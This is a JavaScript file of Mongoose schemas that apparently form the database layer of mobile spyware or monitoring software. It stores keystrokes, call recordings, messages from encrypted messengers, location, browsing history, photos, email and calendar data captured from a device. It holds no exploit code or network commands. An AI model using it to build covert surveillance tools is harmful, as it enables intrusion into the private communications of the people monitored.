const mongoose = require('mongoose');

// Keylogger Data Schema
const keyloggerSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true
  },
  application: {
    name: String,
    package: String,
    version: String
  },
  keystrokes: [{
    key: String,
    timestamp: Date,
    application: String,
    coordinates: {
      x: Number,
      y: Number
    }
  }],
  text: String,
  timestamp: {
    type: Date,
    default: Date.now,
    index: true
  }
});

// Call Data Schema
const callSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true
  },
  callId: {
    type: String,
    required: true,
    unique: true
  },
  type: {
    type: String,
    enum: ['incoming', 'outgoing', 'missed', 'rejected'],
    required: true
  },
  phoneNumber: {
    type: String,
    required: true
  },
  contactName: String,
  startTime: {
    type: Date,
    required: true,
    index: true
  },
  endTime: Date,
  duration: Number, // in seconds
  recordingUrl: String,
  location: {
    latitude: Number,
    longitude: Number,
    accuracy: Number
  },
  network: {
    type: String,
    carrier: String
  },
  notes: String,
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// SMS/Message Data Schema
const messageSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true
  },
  messageId: {
    type: String,
    required: true,
    unique: true
  },
  type: {
    type: String,
    enum: ['sms', 'mms', 'imessage', 'whatsapp', 'telegram', 'signal'],
    required: true
  },
  direction: {
    type: String,
    enum: ['incoming', 'outgoing'],
    required: true
  },
  phoneNumber: String,
  contactName: String,
  content: {
    text: String,
    media: [{
      type: String,
      url: String,
      filename: String,
      size: Number
    }]
  },
  status: {
    type: String,
    enum: ['sent', 'delivered', 'read', 'failed'],
    default: 'sent'
  },
  timestamp: {
    type: Date,
    required: true,
    index: true
  },
  application: String,
  threadId: String
});

// Location Data Schema
const locationSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true
  },
  latitude: {
    type: Number,
    required: true
  },
  longitude: {
    type: Number,
    required: true
  },
  accuracy: Number,
  altitude: Number,
  speed: Number,
  heading: Number,
  timestamp: {
    type: Date,
    required: true,
    index: true
  },
  method: {
    type: String,
    enum: ['gps', 'network', 'wifi', 'manual'],
    default: 'gps'
  },
  address: {
    street: String,
    city: String,
    state: String,
    country: String,
    postalCode: String,
    formatted: String
  },
  geofence: {
    name: String,
    action: String, // 'enter', 'exit'
    timestamp: Date
  }
});

// Social Media Data Schema
const socialMediaSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true
  },
  platform: {
    type: String,
    enum: ['whatsapp', 'facebook', 'instagram', 'snapchat', 'telegram', 'discord', 'tinder', 'skype', 'line', 'viber', 'kik'],
    required: true
  },
  type: {
    type: String,
    enum: ['message', 'call', 'post', 'story', 'media', 'contact', 'location'],
    required: true
  },
  sender: {
    id: String,
    name: String,
    phone: String,
    username: String
  },
  receiver: {
    id: String,
    name: String,
    phone: String,
    username: String
  },
  content: {
    text: String,
    media: [{
      type: String,
      url: String,
      filename: String,
      size: Number,
      duration: Number
    }],
    location: {
      latitude: Number,
      longitude: Number,
      address: String
    }
  },
  metadata: {
    messageId: String,
    threadId: String,
    groupId: String,
    isGroup: Boolean,
    isEncrypted: Boolean,
    isDeleted: Boolean
  },
  timestamp: {
    type: Date,
    required: true,
    index: true
  }
});

// App Usage Data Schema
const appUsageSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true
  },
  app: {
    name: String,
    package: String,
    version: String,
    category: String
  },
  startTime: {
    type: Date,
    required: true,
    index: true
  },
  endTime: Date,
  duration: Number, // in seconds
  isForeground: Boolean,
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Browser History Schema
const browserHistorySchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true
  },
  url: {
    type: String,
    required: true
  },
  title: String,
  browser: String,
  visitTime: {
    type: Date,
    required: true,
    index: true
  },
  duration: Number,
  isBookmarked: Boolean,
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Photo/Video Schema
const mediaSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true
  },
  type: {
    type: String,
    enum: ['photo', 'video', 'screenshot'],
    required: true
  },
  filename: {
    type: String,
    required: true
  },
  originalPath: String,
  url: String,
  thumbnail: String,
  size: Number,
  dimensions: {
    width: Number,
    height: Number
  },
  duration: Number, // for videos
  metadata: {
    camera: String,
    location: {
      latitude: Number,
      longitude: Number
    },
    timestamp: Date,
    exif: Object
  },
  source: {
    type: String,
    enum: ['camera', 'gallery', 'screenshot', 'download', 'social'],
    default: 'camera'
  },
  timestamp: {
    type: Date,
    required: true,
    index: true
  }
});

// Email Schema
const emailSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true
  },
  emailId: String,
  subject: String,
  sender: String,
  recipients: [String],
  content: {
    text: String,
    html: String,
    attachments: [{
      filename: String,
      size: Number,
      type: String
    }]
  },
  direction: {
    type: String,
    enum: ['incoming', 'outgoing'],
    required: true
  },
  status: {
    type: String,
    enum: ['read', 'unread', 'sent', 'draft'],
    default: 'unread'
  },
  timestamp: {
    type: Date,
    required: true,
    index: true
  },
  account: String
});

// Calendar Event Schema
const calendarEventSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true
  },
  eventId: String,
  title: {
    type: String,
    required: true
  },
  description: String,
  startTime: {
    type: Date,
    required: true,
    index: true
  },
  endTime: Date,
  location: String,
  attendees: [{
    email: String,
    name: String,
    response: String
  }],
  reminder: [{
    time: Date,
    method: String
  }],
  calendar: String,
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Create models
const KeyloggerData = mongoose.model('KeyloggerData', keyloggerSchema);
const CallData = mongoose.model('CallData', callSchema);
const MessageData = mongoose.model('MessageData', messageSchema);
const LocationData = mongoose.model('LocationData', locationSchema);
const SocialMediaData = mongoose.model('SocialMediaData', socialMediaSchema);
const AppUsageData = mongoose.model('AppUsageData', appUsageSchema);
const BrowserHistoryData = mongoose.model('BrowserHistoryData', browserHistorySchema);
const MediaData = mongoose.model('MediaData', mediaSchema);
const EmailData = mongoose.model('EmailData', emailSchema);
const CalendarEventData = mongoose.model('CalendarEventData', calendarEventSchema);

module.exports = {
  KeyloggerData,
  CallData,
  MessageData,
  LocationData,
  SocialMediaData,
  AppUsageData,
  BrowserHistoryData,
  MediaData,
  EmailData,
  CalendarEventData
}; 